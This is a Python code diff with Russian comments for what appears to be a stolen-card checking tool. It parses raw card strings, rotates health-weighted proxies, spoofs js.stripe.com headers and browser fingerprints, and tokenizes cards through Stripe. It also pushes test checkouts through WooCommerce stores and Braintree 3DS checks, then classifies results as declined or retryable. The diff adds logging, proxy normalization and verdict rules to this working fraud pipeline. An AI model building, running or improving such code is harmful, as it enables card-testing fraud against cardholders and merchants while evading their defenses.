@@ -12,6 +12,7 @@ import uuid
 from datetime import datetime, timezone
 
 import config as _cfg
+import pusto_logger as _log
 
 STRIPE_API_VERSION = _cfg.STRIPE_API_VERSION
 STRIPE_JS_BUILD = _cfg.STRIPE_JS_BUILD
@@ -212,14 +213,9 @@ def extract_pan(raw: str) -> str:
 
 def parse_card(raw: str) -> dict:
     clean = str(raw).strip()
-    if "|" in clean:
-        parts = clean.split("|")
-    elif ":" in clean:
-        parts = clean.split(":")
-    elif "/" in clean and not clean.startswith("http"):
-        parts = clean.split("/")
-    else:
-        parts = clean.split()
+    # Разделители: | : ; / пробелы (если не URL). Поддержка смешанных разделителей вида PAN|MM/YY|CVC
+    delim = r"[|:;/\s]+" if not clean.startswith("http") else r"[|:;\s]+"
+    parts = [p for p in re.split(delim, clean) if p]
 
     # "4111 1111 1111 1111 09 25 123" — 4-блочный PAN + MM YY CVV:
     # раньше number=parts[0]="4111", mm="1111" — мусор на ровном месте
@@ -259,30 +255,91 @@ def mask_pan(raw: str) -> str:
 PROXIES_FILE = os.path.join("data", "proxies.txt")
 
 
+def normalize_proxy(line: str | None) -> str | None:
+    """Нормализует любую строку прокси в валидный URL со схемой:
+    - host:port | SOCKS5 | 119ms -> socks5://host:port
+    - host:port | SOCKS4 | 118ms -> socks4://host:port
+    - host:port | HTTP | 36ms   -> http://host:port
+    - scheme://user:pass@host:port -> сохраняет схему
+    - host:port:user:pass        -> http://user:pass@host:port
+    - host:port                  -> http://host:port
+    """
+    if not line:
+        return None
+    p = str(line).strip()
+    if not p or p.startswith("#"):
+        return None
+    if "|" in p:
+        parts = [seg.strip() for seg in p.split("|")]
+        host_port = parts[0]
+        proto = parts[1].lower() if len(parts) > 1 else "http"
+        scheme = "socks5" if "socks5" in proto else ("socks4" if "socks4" in proto else "http")
+        return f"{scheme}://{host_port}"
+    if "://" in p:
+        return p
+    toks = p.split(":")
+    if len(toks) == 4:
+        return f"http://{toks[2]}:{toks[3]}@{toks[0]}:{toks[1]}"
+    elif len(toks) == 2:
+        return f"http://{p}"
+    return f"http://{p}"
+
+
 def load_proxies(path: str = PROXIES_FILE) -> list[str]:
-    """Строки формата scheme://user:pass@host:port или host:port (по умолчанию http)."""
+    """Строки любого формата нормализуются в scheme://host:port без дубликатов."""
     proxies = []
+    seen = set()
     if os.path.exists(path):
-        with open(path, encoding="utf-8") as f:
+        with open(path, encoding="utf-8", errors="ignore") as f:
             for line in f:
-                p = line.strip()
-                if not p or p.startswith("#"):
-                    continue
-                if "://" not in p:
-                    p = "http://" + p
-                proxies.append(p)
+                norm = normalize_proxy(line)
+                if norm and norm not in seen:
+                    seen.add(norm)
+                    proxies.append(norm)
     return proxies
 
 
 def pick_proxy(pool: list[str] | None, explicit: str | None) -> str | None:
-    """Явный --proxy приоритетнее; иначе случайный из пула. Схема нормализуется всегда."""
-    def norm(p: str) -> str:
-        return p if "://" in p else "http://" + p
+    """Явный --proxy приоритетнее. Иначе выбор из пула с обязательным условием:
+    прокси должен быть реально проверенным и живым (alive=True в proxy_health.json).
+    Если живых проверенных прокси нет — возвращает None (прямое подключение),
+    чтобы ни в коем случае НЕ ломать чеки пользователю непроверенными узлами!"""
     if explicit:
-        return norm(explicit)
-    if pool:
-        return norm(random.choice(pool))
-    return None
+        return normalize_proxy(explicit)
+    if not pool:
+        return None
+
+    health_file = os.path.join("data", "proxy_health.json")
+    health_map = {}
+    if os.path.exists(health_file):
+        try:
+            with open(health_file, encoding="utf-8") as f:
+                health_map = {h["url"]: h for h in json.load(f) if isinstance(h, dict)}
+        except Exception:
+            health_map = {}
+
+    verified_alive = []
+    weights = []
+    for p in pool:
+        h = health_map.get(p)
+        if not h:
+            continue
+        if h.get("alive") is True and h.get("fail_count", 0) < 2 and h.get("latency_ms"):
+            lat = max(h["latency_ms"], 20)
+            proto_mult = 2.0 if p.startswith("socks5://") else (1.0 if p.startswith("http://") or p.startswith("https://") else 0.8)
+            fails = h.get("fail_count", 0)
+            weight = ((1000.0 / lat) ** 2) * proto_mult / (1.0 + fails * 2.0)
+            verified_alive.append(p)
+            weights.append(weight)
+
+    if not verified_alive:
+        # Если валидация еще не завершилась — используем случайный узел из пула вместо незащищенного DIRECT
+        return random.choice(pool) if pool else None
+
+    try:
+        return random.choices(verified_alive, weights=weights, k=1)[0]
+    except Exception:
+        return verified_alive[0]
 
 
 # --- Сетевая гигиена: детект капчи + экспоненциальный backoff ---
@@ -557,13 +614,15 @@ async def stripe_retrieve_pi(session, pk: str, secret: str) -> dict | None:
             headers={"Origin": "https://js.stripe.com", "Referer": "https://js.stripe.com/",
                      "Accept": "application/json"},
             timeout=10)
+        _log.log_http("GET", f"https://api.stripe.com/v1/payment_intents/{pi_id}", r.status_code)
         if r.status_code != 200:
             return None
         d = r.json()
         if d.get("error"):
             return None
         return {"amount": d.get("amount"), "currency": (d.get("currency") or "").upper(),
-                "capture_method": d.get("capture_method"), "status": d.get("status")}
+                "capture_method": d.get("capture_method"), "status": d.get("status"),
+                "last_payment_error": d.get("last_payment_error")}
     except Exception:
         return None
 
@@ -594,8 +653,10 @@ async def stripe_confirm_pi(session, pk: str, secret: str, pm_id: str,
             headers={"Origin": "https://js.stripe.com", "Referer": "https://js.stripe.com/",
                      "Accept": "application/json"},
             timeout=12)
+        _log.log_http("POST", f"https://api.stripe.com/v1/payment_intents/{pi_id}/confirm", r.status_code)
         return r.json()
     except Exception as e:
+        _log.log_error("stripe", f"confirm_pi network error on {pi_id}", e)
         return {"error": {"type": "network_error", "message": f"{type(e).__name__}: {e}"}}
 
 
@@ -624,11 +685,13 @@ async def stripe_3ds2_authenticate(session, pk: str, source_id: str) -> dict:
             headers={"Origin": "https://js.stripe.com", "Referer": "https://js.stripe.com/",
                      "Accept": "application/json"},
             timeout=12)
+        _log.log_http("POST", "https://api.stripe.com/v1/3ds2/authenticate", r.status_code)
         d = r.json()
         ts = _find_key(d, "transStatus") or ""
         state = _find_key(d, "state") or ""
         return {"transStatus": ts, "state": state, "raw": d}
     except Exception as e:
+        _log.log_error("stripe", f"3ds2_authenticate network error on {source_id}", e)
         return {"transStatus": "", "state": "", "raw": {"error": str(e)}}
 
 
@@ -831,6 +894,11 @@ def classify_verdict(err_msg: str) -> str:
         return "INVALID"
     if "try again" in raw_err or "processing error" in raw_err:
         return "RETRY"
+    # Ошибки несовместимости/сбоя шлюза магазина — это НЕ отказ банка карты
+    if any(k in raw_err for k in ("missing payment details", "invalid or missing payment",
+                                  "zahlungsangaben", "zahlungsarten", "payment_data",
+                                  "payment method is correctly entered")):
+        return "ERROR"
     return "DECLINED"
 
 
@@ -939,7 +1007,7 @@ async def bin_lookup_enriched(bin6: str) -> dict:
     from curl_cffi.requests import AsyncSession
     merged: dict = {"scheme": None, "type": None, "bank": {"name": None},
                     "country": {}, "level": None, "is_vbv": None, "_src": []}
-    async with AsyncSession(impersonate=config.pick_impersonate(), verify=False) as s:
+    async with AsyncSession(impersonate=_cfg.pick_impersonate(), verify=False) as s:
         for url, headers in (
             (f"https://bins.antipublic.cc/bins/{bin6}", {}),
             (f"https://lookup.binlist.net/{bin6}", {"Accept-Version": "3"}),
@@ -1120,6 +1188,7 @@ async def braintree_vbv_check(s, html: str, card_raw: str,
                              json={**tkq, "metaData": {"tokenizationKey": keys["tokenization_key"]}},
                              headers={"Origin": "https://assets.braintreegateway.com",
                                       "Content-Type": "application/json"}, timeout=12)
+            _log.log_http("POST", "https://payments.braintree-api.com/graphql", r.status_code)
         except Exception as e:
             return {"status": "ERROR", "detail": f"gql post: {type(e).__name__}: {e}"[:150]}
         try:
@@ -1140,6 +1209,7 @@ async def braintree_vbv_check(s, html: str, card_raw: str,
         return {"status": "ERROR", "detail": "no usable braintree credential"}
     try:
         r = await s.post(api_url, data=body, headers=headers, timeout=12)
+        _log.log_http("POST", api_url, r.status_code)
         d = _json.loads(r.text)
     except Exception as e:
         return {"status": "ERROR", "detail": f"{type(e).__name__}: {e}"[:150]}
@@ -1325,6 +1395,7 @@ async def store_api_confirm(s, root: str, pk: str, card_raw: str,
 
     try:
         r_cart = await s.get(f"{api}/cart", timeout=10)
+        _log.log_http("GET", f"{api}/cart", r_cart.status_code)
         if r_cart.status_code != 200:
             return {"status": "ERROR",
                     "detail": f"Store API: cart HTTP {r_cart.status_code}",
@@ -1360,6 +1431,7 @@ async def store_api_confirm(s, root: str, pk: str, card_raw: str,
 
         r_prod = await s.get(f"{api}/products", params={"per_page": 30},
                              headers={"Nonce": nonce}, timeout=10)
+        _log.log_http("GET", f"{api}/products", r_prod.status_code)
         _take_nonce(r_prod)  # Woo ротирует nonce в каждом ответе — подхватываем
         items = r_prod.json()
         if not isinstance(items, list) or not items:
@@ -1405,6 +1477,7 @@ async def store_api_confirm(s, root: str, pk: str, card_raw: str,
             r_add = await s.post(f"{api}/cart/add-item", json=body,
                                  headers={"Nonce": nonlocal_nonce[0],
                                           "Content-Type": "application/json"}, timeout=10)
+            _log.log_http("POST", f"{api}/cart/add-item", r_add.status_code)
             _take_nonce(r_add)
             # D-22: успех доказывает форма ответа, а не код. 302→HTML-200 больше
             # не проходит как «добавилось» — иначе корзина пуста, checkout 409.
@@ -1413,6 +1486,8 @@ async def store_api_confirm(s, root: str, pk: str, card_raw: str,
                 prod = cand_p
                 break
             last_reason = why or f"ADD_ITEM_REJECTED(http {r_add.status_code})"
+            if r_add.status_code in (401, 403, 429):
+                break
         if prod is None:
             return {"status": "ERROR",
                     "detail": f"{last_reason}: tried {len(under_cap)} product(s) under cap",
@@ -1561,13 +1636,16 @@ async def store_api_confirm(s, root: str, pk: str, card_raw: str,
         tok_body = tokenize_body(card, telem, root)
         r_tok = await s.post("https://api.stripe.com/v1/payment_methods",
                              data=tok_body, headers=TOKENIZE_HEADERS, timeout=10)
+        _log.log_http("POST", "https://api.stripe.com/v1/payment_methods", r_tok.status_code)
         tok_data = r_tok.json()
         if "id" not in tok_data:
             err = tok_data.get("error", {})
+            _log.log_stripe("TOKENIZE_FAIL", mask_pan(card_raw), err.get("code", "error"), err.get("message", ""))
             return {"status": classify_verdict(str(err.get("message", "")) + str(err.get("code", ""))),
                     "detail": err.get("message", str(tok_data))[:200],
                     "amount_cents": price_c, "currency": curr}
         pm_id = tok_data["id"]
+        _log.log_stripe("TOKENIZE_OK", pm_id, detail=mask_pan(card_raw))
 
         # D-25: слаг обязан существовать на сайте. Иначе Woo ответит
         # payment_method_disabled и схлопнет корзину — карта уже токенизирована и
@@ -1639,6 +1717,7 @@ async def store_api_confirm(s, root: str, pk: str, card_raw: str,
         for attempt in range(10):
             r_co = await s.post(f"{api}/checkout", json=checkout_body,
                                 headers={"Nonce": nonlocal_nonce[0]}, timeout=20)
+            _log.log_http("POST", f"{api}/checkout", r_co.status_code)
             _take_nonce(r_co)
             txt = r_co.text
             try:
